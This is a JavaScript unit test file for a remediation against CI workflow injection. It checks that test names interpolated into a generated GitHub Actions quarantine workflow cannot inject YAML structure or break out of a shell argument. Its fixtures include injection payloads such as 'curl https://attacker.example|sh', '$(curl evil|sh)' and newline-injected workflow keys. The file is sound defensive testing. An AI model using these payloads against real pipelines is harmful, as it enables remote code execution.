// tests/unit/flaky-quarantine-escaping.test.js
// CodeQL #5 remediation regressions: untrusted test identifiers (suite and
// test names parsed from repository CI output) are interpolated into the
// generated GitHub Actions quarantine workflow at two layers and must remain
// DATA at both:
//   YAML  — control characters cannot escape the `command: |` block scalar
//           or the trailing `#` comment lines to inject workflow structure.
//   shell — backslash, double quote, dollar sign, and backtick cannot break
//           out of the double-quoted --testNamePattern argument.
//
// The whole generated document is parsed with a real YAML parser (js-yaml),
// and the shell argument is decoded with a POSIX double-quote tokenizer, so
// the assertions hold at the actual parsing layers rather than against
// substring trivia.

import { jest } from "@jest/globals";
import { load as yamlLoad } from "js-yaml";

const mockQuery = jest.fn();

await jest.unstable_mockModule("../../src/lib/db.js", () => ({ db: { query: mockQuery } }));
await jest.unstable_mockModule("../../src/lib/logger.js", () => ({
  logger: { info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn(), child: () => ({ info: jest.fn(), warn: jest.fn(), error: jest.fn(), debug: jest.fn() }) },
}));
await jest.unstable_mockModule("../../src/services/pipelineEvents.js", () => ({ Events: { record: jest.fn() } }));
await jest.unstable_mockModule("@anthropic-ai/sdk", () => ({
  default: class { constructor() { this.messages = { create: jest.fn().mockResolvedValue({ content: [{ type: "text", text: "[]" }] }) }; } },
}));
await jest.unstable_mockModule("../../config/index.js", () => ({
  config: { server: { env: "test" }, anthropic: { apiKey: "test", baseURL: "http://test" }, ai: { model: "test-model" } },
}));

const { buildQuarantineWorkflow, sanitizeTestIdentifier } = await import("../../src/services/flakyTestService.js");

// POSIX double-quote decoder for a single shell argument. Input: the raw
// command-line tail exactly as the generated line carries it (starting
// AFTER the opening quote). Returns the decoded argument so far and the
// text remaining AFTER the quote that terminated it. The argument is
// well-formed exactly when the terminator is the intended closing quote —
// i.e. `rest` is the intended trailing redirect (`2>&1`) and nothing else.
// Any unescaped quote inside the payload ends the argument early and shows
// up as attacker text in `rest` — precisely the injection this remediation
// must prevent.
function shDecodeDoubleQuoted(raw) {
  let out = "";
  for (let i = 0; i < raw.length; i += 1) {
    const ch = raw[i];
    if (ch === "\\") {
      out += raw[i + 1] ?? "";
      i += 1;
      continue;
    }
    if (ch === `"`) return { out, rest: raw.slice(i + 1) };
    out += ch;
  }
  return { out, rest: "" };
}

// Extract the testNamePattern argument payload from the generated command
// block: everything between `--testNamePattern="` and the line's end.
function extractTestNamePatternRaw(yamlText) {
  const line = yamlText.split("\n").find((l) => l.includes("--testNamePattern="));
  if (!line) return null;
  const at = line.indexOf('--testNamePattern="');
  return line.slice(at + '--testNamePattern="'.length);
}

function candidate(suite, name) {
  return { test_suite: suite, test_name: name, flakiness_score: 0.42, run_count: 10 };
}

describe("sanitizeTestIdentifier (unit)", () => {
  it("strips every C0 control character and DEL to a space (YAML layer)", () => {
    const out = sanitizeTestIdentifier("a\nb\rc\td\x00e\x1ff\x7fg");
    expect(out).toBe("a b c d e f g");
    // No control characters survive anywhere in the sanitized value.
    expect(/[\u0000-\u001f\u007f]/.test(out)).toBe(false);
  });

  it("escapes backslash BEFORE double quote — the \\\" pair cannot close the shell string", () => {
    const out = sanitizeTestIdentifier("evil\\\"; touch /tmp/pwned; \\\"");
    // The source backslash is doubled first, then the quote is escaped, so a
    // POSIX decoder reads: backslash, quote, ; touch ... — all inside the arg.
    const decoded = shDecodeDoubleQuoted(out);
    expect(decoded.rest).toBe("");
    expect(decoded.out).toBe("evil\\\"; touch /tmp/pwned; \\\"");
  });

  it("escapes dollar sign and backtick (command substitution and expansion stay data)", () => {
    const out = sanitizeTestIdentifier("$(id) `id` $HOME");
    const decoded = shDecodeDoubleQuoted(out);
    expect(decoded.rest).toBe("");
    expect(decoded.out).toBe("$(id) `id` $HOME");
    expect(out).toContain("\\$");
    expect(out).toContain("\\`");
  });

  it("leaves ordinary test names byte-identical (equivalent quarantine behavior)", () => {
    expect(sanitizeTestIdentifier("auth > logs in with valid token [slow]")).toBe("auth > logs in with valid token [slow]");
  });
});

describe("buildQuarantineWorkflow (generated-document regressions)", () => {
  it("produces a YAML-parseable workflow with exactly one job and the intended steps for a normal candidate", () => {
    const doc = yamlLoad(buildQuarantineWorkflow([candidate("auth", "logs in")], { full_name: "o/r" }));
    expect(Object.keys(doc.jobs)).toEqual(["quarantine"]);
    expect(doc.jobs.quarantine["runs-on"]).toBe("ubuntu-latest");
    const names = doc.jobs.quarantine.steps.map((s) => s.name ?? s.uses);
    expect(names).toEqual(["actions/checkout@v4", "Set up Node", undefined, "Run quarantined tests"]);
    // The filter argument decodes to the exact benign name.
    const raw = extractTestNamePatternRaw(buildQuarantineWorkflow([candidate("auth", "logs in")], { full_name: "o/r" }));
    const decoded = shDecodeDoubleQuoted(raw);
    expect(decoded.out).toBe("auth > logs in");
    expect(decoded.rest.trim()).toBe("2>&1");
  });

  it("SHELL INJECTION: a crafted \\\" name cannot terminate the testNamePattern argument", () => {
    const evil = 'evil\\"; curl https://attacker.example|sh; \\"';
    const yamlText = buildQuarantineWorkflow([candidate("suite", evil)], { full_name: "o/r" });
    const decoded = shDecodeDoubleQuoted(extractTestNamePatternRaw(yamlText));
    expect(decoded.out).toBe('suite > evil\\"; curl https://attacker.example|sh; \\"');
    expect(decoded.rest.trim()).toBe("2>&1"); // the closing quote is the INTENDED one — payload stayed one argument
  });

  it("SHELL INJECTION: $(), backticks, and $VAR remain literal data", () => {
    const yamlText = buildQuarantineWorkflow([candidate("s", "$(curl evil|sh) `id` ${IFS}")], { full_name: "o/r" });
    const decoded = shDecodeDoubleQuoted(extractTestNamePatternRaw(yamlText));
    expect(decoded.out).toBe("s > $(curl evil|sh) `id` ${IFS}");
    expect(decoded.rest.trim()).toBe("2>&1");
  });

  it("YAML STRUCTURE: an embedded newline cannot inject workflow keys — the document parses with unchanged structure", () => {
    const evil = "ok\nruns-on: ubuntu-latest\n    - run: malicious\non: [push]";
    const yamlText = buildQuarantineWorkflow([candidate("s", evil)], { full_name: "o/r" });
    // The whole document still parses and the structure is exactly the
    // intended single quarantine job.
    const doc = yamlLoad(yamlText);
    expect(Object.keys(doc.jobs)).toEqual(["quarantine"]);
    expect(doc.jobs.quarantine["runs-on"]).toBe("ubuntu-latest");
    expect(doc.jobs.quarantine.steps).toHaveLength(4);
    expect(doc.on).toEqual({ schedule: [{ cron: "0 6 * * 1" }], workflow_dispatch: null });
    // The injected text survives as data inside the argument, not as YAML.
    const decoded = shDecodeDoubleQuoted(extractTestNamePatternRaw(yamlText));
    expect(decoded.out).toContain("runs-on: ubuntu-latest");
    expect(decoded.out).toContain("- run: malicious");
    // No line outside the intended template carries the injected markers.
    const structureLines = yamlText.split("\n").filter((l) => /^\s*- run: malicious/.test(l) || /^\s*on: \[push\]/.test(l));
    expect(structureLines).toEqual([]);
  });

  it("YAML STRUCTURE: carriage returns are neutralized identically", () => {
    const yamlText = buildQuarantineWorkflow([candidate("s", "a\r\njobs:\r\n  evil: boom")], { full_name: "o/r" });
    const doc = yamlLoad(yamlText);
    expect(Object.keys(doc.jobs)).toEqual(["quarantine"]);
  });

  it("multiple candidates join with | and each is sanitized independently", () => {
    const yamlText = buildQuarantineWorkflow(
      [candidate("s1", 'n\\"1'), candidate("s2", "$x")],
      { full_name: "o/r" },
    );
    const decoded = shDecodeDoubleQuoted(extractTestNamePatternRaw(yamlText));
    expect(decoded.out).toBe('s1 > n\\"1|s2 > $x');
    expect(decoded.rest.trim()).toBe("2>&1");
  });

  it("comment lines carry the same sanitization (no control characters anywhere in the document)", () => {
    const yamlText = buildQuarantineWorkflow([candidate("s", "line1\nline2")], { full_name: "o/r" });
    expect(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/.test(yamlText)).toBe(false);
    // Newlines exist only as the template's own line separators: the comment
    // line shows the name flattened to one line.
    expect(yamlText).toMatch(/# - \[42% failure rate\] s > line1 line2/);
  });
});
